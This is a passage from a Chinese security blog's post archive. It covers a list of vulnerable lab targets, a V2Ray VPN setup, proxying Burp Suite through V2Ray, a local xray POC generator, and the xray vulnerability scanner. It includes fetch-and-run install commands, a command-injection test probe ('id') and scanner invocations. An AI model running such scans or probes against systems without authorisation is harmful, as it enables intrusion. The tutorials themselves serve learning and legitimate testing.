href="http://sourceforge.net/projects/gns-3/" target="_blank" rel="noopener">http://sourceforge.net/projects/gns-3/</a></td></tr><tr><td>OCCP</td><td><a href="https://opencyberchallenge.net/" target="_blank" rel="noopener">https://opencyberchallenge.net/</a></td></tr><tr><td>XAMPP</td><td><a href="https://www.apachefriends.org/index.html" target="_blank" rel="noopener">https://www.apachefriends.org/index.html</a></td></tr></tbody></table><h1 id="0x09-Miscellaneous"><a href="#0x09-Miscellaneous" class="headerlink" title="0x09 Miscellaneous"></a>0x09 <strong>Miscellaneous</strong></h1><table><thead><tr><th>VulnVPN</th><th><a href="http://www.rebootuser.com/?page_id=1041" target="_blank" rel="noopener">http://www.rebootuser.com/?page_id=1041</a></th></tr></thead><tbody><tr><td>VulnVoIP</td><td><a href="http://www.rebootuser.com/?page_id=1041" target="_blank" rel="noopener">http://www.rebootuser.com/?page_id=1041</a></td></tr><tr><td>Vulnserver</td><td><a href="http://www.thegreycorner.com/2010/12/introducing-vulnserver.html" target="_blank" rel="noopener">http://www.thegreycorner.com/2010/12/introducing-vulnserver.html</a></td></tr><tr><td>NETinVM</td><td><a href="http://informatica.uv.es/~carlos/docencia/netinvm/" target="_blank" rel="noopener">http://informatica.uv.es/~carlos/docencia/netinvm/</a></td></tr><tr><td>DVRF</td><td><a href="https://github.com/praetorian-inc/DVRF" target="_blank" rel="noopener">https://github.com/praetorian-inc/DVRF</a></td></tr><tr><td>HackSys Extreme Vulnerable Driver</td><td><a href="http://www.payatu.com/hacksys-extreme-vulnerable-driver/" target="_blank" rel="noopener">http://www.payatu.com/hacksys-extreme-vulnerable-driver/</a></td></tr><tr><td>VirtuaPlant</td><td><a href="https://github.com/jseidl/virtuaplant" target="_blank" rel="noopener">https://github.com/jseidl/virtuaplant</a></td></tr><tr><td>Fosscomm</td><td><a href="https://github.com/nikosdano/fosscomm" target="_blank" rel="noopener">https://github.com/nikosdano/fosscomm</a></td></tr><tr><td>Morning Catch</td><td><a href="http://blog.cobaltstrike.com/2014/08/06/introducing-morning-catch-a-phishing-paradise/" target="_blank" rel="noopener">http://blog.cobaltstrike.com/2014/08/06/introducing-morning-catch-a-phishing-paradise/</a></td></tr><tr><td>AWBO</td><td><a href="https://labs.snort.org/awbo/awbo.html" target="_blank" rel="noopener">https://labs.snort.org/awbo/awbo.html</a></td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9元钱搭建一个自己的VPN</title>
      <link href="/2019/09/20/9%E5%85%83%E9%92%B1%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84VPN/"/>
      <url>/2019/09/20/9%E5%85%83%E9%92%B1%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84VPN/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>科学上网。。。。此处省略一万字</p><a id="more"></a><h1 id="0x01-需求分析"><a href="#0x01-需求分析" class="headerlink" title="0x01 需求分析"></a>0x01 需求分析</h1><blockquote><p>1.一个Linux系统的vps</p><p>2.v2ray脚本</p><p>3.v2ray客户端</p></blockquote><h1 id="0x02-购买VPS"><a href="#0x02-购买VPS" class="headerlink" title="0x02 购买VPS"></a>0x02 购买VPS</h1><p>购买地址：<a href="https://virmach.com/" target="_blank" rel="noopener">传送门</a>,选择第四项，经济实惠的<code>Linux</code></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031221505.png" class="lozad"></p><p>然后拉到最底下，选择<code>KVM VPS</code>，注意，这里不要选<code>open VZ</code>的<code>VPS</code>，因为这个虚拟主机不能进行<code>bbr plus</code>加速，笔者在这里踩了一个大坑，找了好久资料，没有解决，最后在团队群里的一个小伙伴告诉我了。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031221531.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031221555.png" class="lozad"></p><p>选择vps的配置</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031221633.png" class="lozad"></p><p>位置就选默认的，速度杠杠的，然后添加到购物车</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031221703.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031221711.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031221737.png" class="lozad"></p><p>完成订单后会跳到支付宝付款的界面，扫码付钱就行了。</p><p>之所以选择Ubuntu16位的系统是因为笔者试过了debian，centos的系统，发现都不行，真是所有坑都被我踩了。</p><h1 id="0x03-安装-V2Ray"><a href="#0x03-安装-V2Ray" class="headerlink" title="0x03 安装 V2Ray"></a>0x03 安装 V2Ray</h1><p>输入下面命令回车，你可以复制过去，然后在 Xshell 界面按 Shift + Insert 即可粘贴，不能按 Ctrl + V 的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -s -L https://git.io/v2ray.sh)</span><br></pre></td></tr></table></figure><p>如果提示 curl: command not found ，那是因为你的 VPS 没装 Curl</p><p>ubuntu/debian 系统安装 Curl 方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update -y &amp;&amp; apt-get install curl -y</span><br></pre></td></tr></table></figure><p>centos 系统安装 Curl 方法: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update -y &amp;&amp; yum install curl -y</span><br></pre></td></tr></table></figure><p>安装好 curl 之后就能安装脚本了</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031221854.png" class="lozad"></p><p>输入1，回车，开始安装</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031221822.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031221926.png" class="lozad"></p><p>选择协议，默认TCP，回车即可</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031221935.png" class="lozad"></p><p>选择端口，回车</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031221944.png" class="lozad"></p><p>广告拦截，回车自动选择N</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031222020.png" class="lozad"></p><p>配置Shadowsocks，有需要的可以配置，也可以先不配置，等配置好v2ray以后在配置也可以</p><p>最后按enter键，等待一会，会有v2ray的配置信息出现，说明配置好了</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031222029.png" class="lozad"></p><p>下载v2ray的客户端，然后导入刚刚复制的复制的配置信息，客户端下载<a href="https://github.com/2dust/v2rayN/releases/tag/2.50" target="_blank" rel="noopener">传送门</a></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031222101.png" class="lozad"></p><p>选择从剪切板导入，导入成功后会出现下图</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031222206.png" class="lozad"></p><p>有点右下角的v2ray客户端小图标，点击启用http代理</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031222158.png" class="lozad"></p><p>模式选择，有<strong>全局模式</strong>和PAC模式，</p><p><strong>全局模式</strong>状态下，你访问的所有流量都会先经过vps服务器，相当于vps是一个中间者，</p><p><strong>PAC模式</strong>状态下，你访问的流量会自动分流，国内的网站不会经过vps，只有国外的网站才会经过vps</p><p>OK,现在就可以访问Google试试了，</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031222226.png" class="lozad"></p><p>访问YouTube</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031222556.png" class="lozad"></p><p>到这里，FQ已经是成功了，但是，有个问题就是访问的网速却很慢，so，需要进行加速操作。</p><h1 id="0x04-BBR-plus内核加速"><a href="#0x04-BBR-plus内核加速" class="headerlink" title="0x04 BBR plus内核加速"></a>0x04 BBR plus内核加速</h1><h2 id="4-1-安装证书"><a href="#4-1-安装证书" class="headerlink" title="4.1 安装证书"></a>4.1 安装证书</h2><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install ca-certificates</span><br><span class="line">或</span><br><span class="line">yum -y install ca-certificates</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031222739.png" class="lozad"></p><h2 id="4-2-安装加速脚本"><a href="#4-2-安装加速脚本" class="headerlink" title="4.2 安装加速脚本"></a>4.2 安装加速脚本</h2><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget &quot;https://github.com/chiakge/Linux-NetSpeed/raw/master/tcp.sh&quot; &amp;&amp; chmod +x tcp.sh &amp;&amp; ./tcp.sh</span><br></pre></td></tr></table></figure><p>先在[1– 3]切换内核（第一次显示为bbr内核也要切换一遍），重启</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031222542.png" class="lozad"></p><p>安装完成，重启vps</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031222834.png" class="lozad"></p><h2 id="4-2-运行"><a href="#4-2-运行" class="headerlink" title="4.2 运行"></a>4.2 运行</h2><p>重启后不用再下载脚本，直接<code>./tcp.sh</code> ，在[4 – 8]中选你要开的加速</p><blockquote><p>“1. 安装 BBR/BBR魔改版内核” 对应4,5,6（原版，魔改，暴力魔改）</p><p>“2. 安装 BBRplus版内核 ” 对应7（plus）</p><p>“3. 安装 Lotserver(锐速)内核” 对应8（锐速）</p></blockquote><p>开启后再 ./tcp.sh ， 显示开启成功则启动成功，你也可以自己手动确认</p><p>现在你可以自由的切换你想要的加速，直到你不想折腾为止~</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031222842.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031222848.png" class="lozad"></p><p>然后在访问YouTube，测试速度，发现速度飕飕的。1080p点到哪里看哪里。</p><h1 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h1><ol><li><a href="https://github.com/233boy/v2ray/wiki/V2Ray搭建详细图文教程" target="_blank" rel="noopener">https://github.com/233boy/v2ray/wiki/V2Ray%E6%90%AD%E5%BB%BA%E8%AF%A6%E7%BB%86%E5%9B%BE%E6%96%87%E6%95%99%E7%A8%8B</a></li><li><a href="https://zhujiwiki.com/8563/" target="_blank" rel="noopener">https://zhujiwiki.com/8563/</a></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科学上网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用burpsuite抓取Google的数据包</title>
      <link href="/2019/09/20/%E4%BD%BF%E7%94%A8burpsuite%E6%8A%93%E5%8F%96Google%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/"/>
      <url>/2019/09/20/%E4%BD%BF%E7%94%A8burpsuite%E6%8A%93%E5%8F%96Google%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>我们在测试的过程中，可能会碰到必须需要挂VPN代理才能访问的网站，但是挂了VPN以后，就不能继续设置代理抓包了，最近有一个朋友帮助我解决了这一问题。下面来给大家讲讲其中的原理和操作方法。</p><h1 id="0x01-需要的环境"><a href="#0x01-需要的环境" class="headerlink" title="0x01 需要的环境"></a>0x01 需要的环境</h1><blockquote><p>本机：Windows10 X64</p><p>需要的软件：V2ray客户端</p><p>​    burpsuite</p><p>VPS:安装了v2ray</p></blockquote><h1 id="0x02-原理解析"><a href="#0x02-原理解析" class="headerlink" title="0x02 原理解析"></a>0x02 原理解析</h1><p>原理及时本地浏览器开启本地的8080端口的代理，然后在burp中设置一个1080的本地端口代理。然后通过V2ray客户端将本地的1080端口和vps的43085端口映射上。这样就大ton过本地浏览器-&gt;burpsuite-&gt;vps-&gt;目标网站的通路，当然抓包也就不成问题了，下图是我按照自己的理解画的一个数据流向图，帮助大家理解一下其中的原理，如果理解错误的地方，欢迎大家指出。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160949.png" class="lozad"></p><h1 id="0x03-操作流程"><a href="#0x03-操作流程" class="headerlink" title="0x03 操作流程"></a>0x03 操作流程</h1><p>1.浏览器开启代理</p><p>这里我使用了代理工具了，也可以直接在设置里面去设置。这个不会的请出门右转百度。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160957.png" class="lozad"></p><p>2.burp中的设置</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161011.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161024.png" class="lozad"></p><p>3.v2ray客户端的配置</p><p>需要开启全局代理模式。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161042.png" class="lozad"></p><p>4.访问测试</p><p>burp下不拦截数据包，随便访问一个网站，看看能否正常访问，可以正常访问说明数据是通的，配置没有问题。</p><p>可以正常访问hao123.</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161057.png" class="lozad"></p><p>访问谷歌也是正常</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161103.png" class="lozad"></p><p>看看<code>burpsuite</code>的历史记录中，已经有了谷歌和<code>hao123</code>的数据包记录。 数据的流向正的没有问题。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161118.png" class="lozad"></p><p>抓一个youtube的包试试，成功抓到了YouTube的请求包</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161130.png" class="lozad"></p><p>YouTube的返回包</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161143.png" class="lozad"></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>前人栽树后人乘凉，本着分享的精神和大家分享一下，大家共同进步，觉得文章不错的点个赞就好，觉得很烂的，留下你的足迹就好。</p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地搭建一个poc生成器</title>
      <link href="/2019/09/17/%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AApoc%E7%94%9F%E6%88%90%E5%99%A8/"/>
      <url>/2019/09/17/%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AApoc%E7%94%9F%E6%88%90%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天在网上意外看到一个在线的<code>poc</code>生成工具，<a href="https://phith0n.github.io/xray-poc-generation/" target="_blank" rel="noopener">传送门</a>,界面如下</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114144702.png" class="lozad"></p><p>看到网址应该使用<code>GitHub page</code>来生成的，于是条件反射的觉得这个工具应该是开源的，so，复制<a href="https://phith0n.github.io/xray-poc-generation/" target="_blank" rel="noopener">xray-poc-generation</a>到<code>GitHub</code>上搜一下看看，果然，和我猜测的一样，这个工具是开源的。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114144710.png" class="lozad"></p><p><code>GitHub</code>截图</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114144727.png" class="lozad"></p><h1 id="0x01-编译项目"><a href="#0x01-编译项目" class="headerlink" title="0x01 编译项目"></a>0x01 编译项目</h1><blockquote><p>环境需求：</p><p>Git  <a href="https://www.git-scm.com/download/" target="_blank" rel="noopener">传送门</a></p><p>Node.js <a href="http://nodejs.cn/download/" target="_blank" rel="noopener">传送门</a></p><p>Yarn</p></blockquote><p>安装好<code>Git</code>后，使用<code>git</code>将项目克隆到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/phith0n/xray-poc-generation</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114144802.png" class="lozad"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd xray-poc-generation</span><br><span class="line"></span><br><span class="line">yarn</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114144813.png" class="lozad"></p><p>原因：没有安装<code>yarn</code></p><p>使用<code>nmp install -g yarn</code>一键安装</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114144825.png" class="lozad"></p><p>然后在使用<code>yarn</code>命令</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114144848.png" class="lozad"></p><p>yarn build</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114144907.png" class="lozad">    <img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114144942.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114144955.png" class="lozad"></p><h1 id="0x02-本地搭建"><a href="#0x02-本地搭建" class="headerlink" title="0x02 本地搭建"></a>0x02 本地搭建</h1><blockquote><p>环境需求：</p><p>Windows server 2003</p><p>PHPstudy</p></blockquote><p>将编译好的<code>build</code>文件夹中的内容直接复制到<code>www</code>根目录</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114145053.png" class="lozad"></p><p>使用<code>ipconfig</code>命令查看<code>Windows server 2003 ip</code>地址</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114145117.png" class="lozad"></p><p>然后使用 <code>http://ip地址</code> 直接访问</p><blockquote><p>注：如果直接将build文件夹复制到www目录下，需要修改index.html的文件，将相对路径改成含build的目录。</p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114145131.png" class="lozad"></p><h1 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h1><p>【测试数据】</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">poc-yaml-test</span><br><span class="line"></span><br><span class="line">post</span><br><span class="line"></span><br><span class="line">/poc?name=1</span><br><span class="line"></span><br><span class="line">command=&apos;id&apos;</span><br><span class="line"></span><br><span class="line">status == 200 &amp;&amp; body.bcontains(b&apos;test output&apos;)</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114145150.png" class="lozad"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XRay-一款好用的漏洞挖掘工具</title>
      <link href="/2019/09/17/XRay-%E4%B8%80%E6%AC%BE%E5%A5%BD%E7%94%A8%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7/"/>
      <url>/2019/09/17/XRay-%E4%B8%80%E6%AC%BE%E5%A5%BD%E7%94%A8%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在漏洞挖掘中除了手动挖掘，一般都是用一些扫描器开辅助我们去进行测试，比如AWVS,APPSCAN，netsparker等等。今天给大家介绍一款被动扫描的扫描漏洞的神器——Xray，这款工具我自己用过了，的确挺好用，还能让burpsuite作为下游代理，不耽误测试。</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/c2c21aac4effe107" class="lozad"></p><h1 id="0x01-xray简介"><a href="#0x01-xray简介" class="headerlink" title="0x01 xray简介"></a>0x01 xray简介</h1><p>xray是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神器，支持主动、被动多种扫描方式，自备盲打平台、可以灵活定义 POC，功能丰富，调用简单，支持Windows /macOS / Linux 多种操作系统，可以满足广大安全从业者的自动化 Web 漏洞探测需求。</p><p>下载地址：<a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">传送门</a></p><p>官网地址：<a href="https://chaitin.github.io/xray/#/" target="_blank" rel="noopener">传送门</a></p><p>github地址：<a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">传送门</a></p><blockquote><p>可检测漏洞模块</p><ul><li><p>XSS漏洞检测 (key: xss)</p><p>利用语义分析的方式检测XSS漏洞</p></li><li><p>SQL 注入检测 (key: sqldet)</p><p>支持报错注入、布尔注入和时间盲注等</p></li><li><p>命令/代码注入检测 (key: cmd_injection)</p><p>支持 shell 命令注入、PHP 代码执行、模板注入等</p></li><li><p>目录枚举 (key: dirscan)</p><p>检测备份文件、临时文件、debug 页面、配置文件等10余类敏感路径和文件</p></li><li><p>路径穿越检测 (key: path_traversal)</p><p>支持常见平台和编码</p></li><li><p>XML 实体注入检测 (key: xxe)</p><p>支持有回显和反连平台检测</p></li><li><p>poc 管理 (key: phantasm)</p><p>默认内置部分常用的 poc，用户可以根据需要自行构建 poc 并运行。文档：<a href="https://chaitin.github.io/xray/#/guide/poc" target="_blank" rel="noopener">https://chaitin.github.io/xray/#/guide/poc</a></p></li><li><p>文件上传检测 (key: upload)</p><p>支持常见的后端语言</p></li><li><p>弱口令检测 (key: brute_force)</p><p>社区版支持检测 HTTP 基础认证和简易表单弱口令，内置常见用户名和密码字典</p></li><li><p>jsonp 检测 (key: jsonp)</p><p>检测包含敏感信息可以被跨域读取的 jsonp 接口</p></li><li><p>ssrf 检测 (key: ssrf)</p><p>ssrf 检测模块，支持常见的绕过技术和反连平台检测</p></li><li><p>基线检查 (key: baseline)</p><p>检测低 SSL 版本、缺失的或错误添加的 http 头等</p></li><li><p>任意跳转检测 (key: redirect)</p><p>支持 HTML meta 跳转、30x 跳转等</p></li><li><p>CRLF 注入 (key: crlf_injection)</p><p>检测 HTTP 头注入，支持 query、body 等位置的参数</p></li><li><p>..</p></li></ul></blockquote><h1 id="0x02-快速使用"><a href="#0x02-快速使用" class="headerlink" title="0x02 快速使用"></a>0x02 快速使用</h1><p>官网演示：</p><p><img alt="img" data-src="https://camo.githubusercontent.com/8b552644c67728075ef96a2cc56bf15730f21d28/68747470733a2f2f6368616974696e2e6769746875622e696f2f787261792f6173736574732f7465726d2e737667" class="lozad"></p><ol><li><p>使用基础爬虫爬取并对爬虫爬取的链接进行漏洞扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --basic-crawler http://example.com --html-output vuln.html</span><br></pre></td></tr></table></figure><p>不指定输出时，默认输出到控制台的标准输出中,不同参数对应不同的输出方式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#无参数：输出到控制台的标准输出</span></span><br><span class="line">--`text-output`：输出到文本文件中</span><br><span class="line">--`json-output`：输出到 JSON 文件中</span><br><span class="line">--`html-output`：输出到 HTML 文件中</span><br></pre></td></tr></table></figure><p>使用HTTP代理进行被动扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure><p>设置浏览器http代理为<code>http://127.0.0.1:7777</code>，就可以自动分析代理流量并扫描。</p><blockquote><p>如需扫描https流量，请阅读下方文档<code>抓取 https 流量</code>部分</p></blockquote></li><li><p>只扫描单个url，不使用爬虫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --url http://example.com/ ？a = b --html-output single-url.html</span><br></pre></td></tr></table></figure></li><li><p>手动指定本次运行的插件</p><p>默认情况下，将会启用所有内置插件，可以使用下列命令指定本次扫描启用的插件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins cmd_injection，sqldet --url http://example.com</span><br><span class="line">xray webscan --plugins cmd_injection，sqldet --listen 127.0.0.1:7777</span><br></pre></td></tr></table></figure></li><li><p>指定插件输出</p><p>可以指定将本次扫描的漏洞信息输出到某个文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --url http://example.com/ ？a = b</span><br><span class="line">--text-output result.txt --json-output result.json --html-output report.html</span><br></pre></td></tr></table></figure><p><a href="https://chaitin.github.io/xray/assets/report_example.html" target="_blank" rel="noopener">报告样例</a></p></li><li><p>运行只单个<strong>内置</strong> POC</p><p>在xray中，所有的pocdency属于插件<code>phantasm</code>，所以使用poc时需要开启<code>phantasm</code>插件才可生效。<code>--poc</code>参数指定本次运行的poc，如不指定，将运行所有的内置poc。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins phantasm --poc poc-yaml-thinkphp5-controller-rce --url http://example.com/</span><br></pre></td></tr></table></figure></li><li><p>运行用户自定义POC</p><p>用户可以按需书写自己的YAML格式的POC，并通过指定<code>--poc</code>参数运行，比如运行在<code>/home/test/1.yaml</code>处的POC。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins phantasm --poc /home/test/1.yaml --url http://example.com/</span><br></pre></td></tr></table></figure><p><code>--poc</code> 参数非常灵活，支持Glob匹配，支持从目录加载，可以从以下几个例子理解用法：</p><p>加载<code>/home/test/pocs/</code>所有的POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins phantasm --poc “ / home / test / pocs / * ”</span><br></pre></td></tr></table></figure><p>加载<code>/home/test/pocs/</code>下包含thinkphp的POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins phantasm --poc “ / home / test / pocs / * thinkphp * ”</span><br></pre></td></tr></table></figure><p>自定义POC请查看文档。</p></li><li><p>转发漏洞信息到数据库，邮件，IM通知等</p><p>用户可以使用<code>--webhook-output</code>将漏洞信息进行转发，后端需要返回状态200才认为发送成功，否则将打印错误日志。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --url http://example.com/ --webhook-output http：// host：port / path</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>ps:如何是Windows的，需要使用xray***.exe文件</p></blockquote><h1 id="0x03-抓取https流量"><a href="#0x03-抓取https流量" class="headerlink" title="0x03  抓取https流量"></a>0x03  抓取https流量</h1><h2 id="3-1-生成证书"><a href="#3-1-生成证书" class="headerlink" title="3.1 生成证书"></a>3.1 生成证书</h2><p>和burp类似，抓取https流量需要信任一个根证书，这个根证书可以自行生成，也可用下列自带的命令生成：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xray genca  <span class="comment">## Linux</span></span><br><span class="line"></span><br><span class="line">xray_windows_amd64.exe genca <span class="comment">##Windows</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162906.png" class="lozad"></p><p>然后xray文件夹下会产生ca证书和ca.key两个文件</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162915.png" class="lozad"></p><blockquote><p>Firefox浏览器没有使用系统的根证书管理器，意味着使用Firefox时需要单独在该浏览内导入证书才可生效。对于移动端等，可以在挂代理之后访问<code>http://xray/</code>然后下载根证书。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162925.png" 